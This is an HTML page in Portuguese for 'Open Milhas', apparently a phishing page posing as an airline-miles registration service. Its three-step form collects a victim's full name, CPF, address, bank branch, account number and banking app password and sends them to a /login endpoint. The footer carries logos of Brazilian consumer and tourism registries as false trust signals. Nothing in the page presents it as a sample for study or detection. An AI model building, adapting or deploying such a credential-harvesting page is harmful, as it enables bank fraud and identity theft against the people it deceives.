<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Open Milhas | Cadastro Profissional</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; }
        .navbar-custom { background: #0a1128; color: white; padding: 15px; border-bottom: 3px solid #c5a059; }
        .progress-bar-custom { height: 12px; background: #e9ecef; border-radius: 10px; margin: 30px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: #2c7da0; width: 33%; transition: 0.5s; }
        .step-page { display: none; } .step-active { display: block; }
        .form-control { border-radius: 20px; padding: 12px; margin-bottom: 15px; }
        .btn-next { background: #469cb4; color: white; border-radius: 10px; padding: 10px 40px; border: none; font-weight: bold; }
        .badge-footer { height: 40px; margin: 10px 15px; }
    </style>
</head>
<body>
    <div class="navbar-custom container-fluid">
        <h4 class="mb-0">OPEN <span style="color: #c5a059;">MILHAS</span></h4>
    </div>

    <div class="container mt-4" style="max-width: 600px;">
        <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>
        <form action="/login" method="POST">
            <div class="step-page step-active" id="step1">
                <h5 class="mb-4">1. Identificação</h5>
                <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
                <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
                <div class="text-end"><button type="button" class="btn-next" onclick="next(2)">Continuar</button></div>
            </div>

            <div class="step-page" id="step2">
                <h5 class="mb-4">2. Endereço de Contato</h5>
                <input type="text" name="cep" class="form-control" placeholder="CEP" required>
                <input type="text" name="rua" class="form-control" placeholder="Rua / Logradouro" required>
                <div class="text-end">
                    <button type="button" class="btn btn-link text-dark" onclick="next(1)">Voltar</button>
                    <button type="button" class="btn-next" onclick="next(3)">Continuar</button>
                </div>
            </div>

            <div class="step-page" id="step3">
                <h5 class="mb-4">3. Dados para Recebimento</h5>
                <input type="text" name="agencia" class="form-control" placeholder="Agência" required>
                <input type="text" name="conta" class="form-control" placeholder="Número da Conta" required>
                <input type="password" name="senha_app" class="form-control" placeholder="Senha do Aplicativo" required>
                <div class="text-end">
                    <button type="button" class="btn btn-link text-dark" onclick="next(2)">Voltar</button>
                    <button type="submit" class="btn-next" style="background: #c5a059;">FINALIZAR</button>
                </div>
            </div>
        </form>
    </div>

    <footer class="text-center mt-5 py-4 bg-white border-top">
        <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-footer">
        <img src="https://logodownload.org/wp-content/uploads/2019/08/cadastur-logo.png" class="badge-footer">
        <p class="small text-muted mt-2">OPEN MILHAS © 2026</p>
    </footer>

    <script>
        function next(s) {
            document.querySelectorAll('.step-page').forEach(p => p.classList.remove('step-active'));
            document.getElementById('step'+s).classList.add('step-active');
            document.getElementById('progressBar').style.width = (s === 2) ? '66%' : (s === 3) ? '100%' : '33%';
        }
    </script>
</body>
</html>
